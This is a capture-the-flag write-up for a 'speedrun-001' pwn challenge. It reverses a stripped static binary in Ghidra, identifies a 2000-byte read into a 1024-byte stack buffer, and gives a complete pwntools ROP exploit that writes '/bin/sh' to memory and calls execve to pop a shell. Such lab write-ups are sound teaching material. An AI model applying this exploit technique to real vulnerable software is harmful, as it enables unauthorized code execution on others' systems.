# Speedrun1 (pwn)
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/c5cbe910-117a-438d-a71f-23cd0fd74428)  

statically linked, stripped executable...
Since the actual exploitation for this challenge is very similar to [simplecalc](./bkp16_simplecalc.md), I'll focus more on the reverse engineering and discovery process.  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/6fd9c59b-d148-4950-a80e-15e227488124)   
The binary asks for our last words, and then gets sassy on us :(  
The fact that our input gets printed back to us made me think of a printf vulnerability, but it ended up not being the case.  
Let's take a look at it in ghidra  

## Reverse Engineering  
First things first let's look at the entry
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/114394cc-e13f-45be-bbcc-a8d05b58ca16)  

by linux conventions this should be `__libc_start_main` so we can start renaming variables  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/e1453ec0-1ad5-44bf-aee3-4a93974036ff)   
Let's take a look at main.  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/ad7fd730-9d26-4552-a08a-643addccadb9)  
There are a bunch of functions being called.  
First interesting one is `FUN_00400b4d`, which seems to just be printing to console   
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/9f152ac8-edb7-4fe2-9907-2142007d5dc6)   
Just from that function signature we can guess that it is either `printf` or `puts`  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/84ff975d-a9e5-4bd2-941b-3b87adee2f7d)  

`FUN_00400bae` seems to also just call `puts` and print some text.  

Therefore, the funciton that asks for input is in between them, `FUN_00400b60`
Main looks a bit better now:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/8195b97f-6242-4c21-b266-5b265232cc7f)  

Let's examine the function that gets input:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/968e789a-c9a7-41bc-a2d7-8bb6ba707b6d)  
If the first function is `puts`, then the other function that prints out our input must be `printf`  
Can you recognize the function signature of the function in the middle?  
Just from that I took an educated guess that it is the `read` function. This is because `read(0,buf,2000)` would correspond to `0 (file descriptor for stdin)`, write into our buffer, 2000 bytes of data.  
However, our buffer is 1024 bytes, so we have a buffer overflow.  

## Exploitation  
From here the process is incredibly similar to [simplecalc](./bkp16_simplecalc.md).  
1. Write padding until return address
2. Write `/bin/sh` to memory using ROP
3. Use ROP to populate registers with adecuate values and do a syscall to execve

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template speedrun-001
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'speedrun-001')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}

'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

#determined using gdb
padding = 1032*b'A'

rop = ROP(exe)

# we want to execute execve
# rax = 59
# rdi = pointer to /bin/sh
# rsi = 0
# rdx = 0

# Ropper found
#0x000000000048d251: mov qword ptr [rax], rdx; ret;

mov_qword_ptr = 0x48d251

# found using vmmap in gdb
write_addr = 0x6b6000
binsh_string = int.from_bytes(b'/bin/sh','little')

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI = (rop.find_gadget(['pop rsi', 'ret']))[0]
POP_RDX = (rop.find_gadget(['pop rdx', 'ret']))[0]
POP_RAX = (rop.find_gadget(['pop rax', 'ret']))[0]
SYSCALL = (rop.find_gadget(['syscall']))[0]

payload = padding

# write binsh into memory
payload += p64(POP_RDX) + p64(binsh_string) # load /bin/sh into rdx
payload += p64(POP_RAX) + p64(write_addr) # load memory address to rax
payload += p64(mov_qword_ptr) # execute the memory write

# call execve
payload += p64(POP_RAX) + p64(59) #syscall number for execve
payload += p64(POP_RDI) + p64(write_addr) # address of binsh string
payload += p64(POP_RDX) + p64(0) # populate regsiter
payload += p64(POP_RSI) + p64(0) # populate register

payload += p64(SYSCALL)

io.sendline(payload)
io.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/aaa4d8c6-2cea-4a70-bd76-8178f3bf9a12)



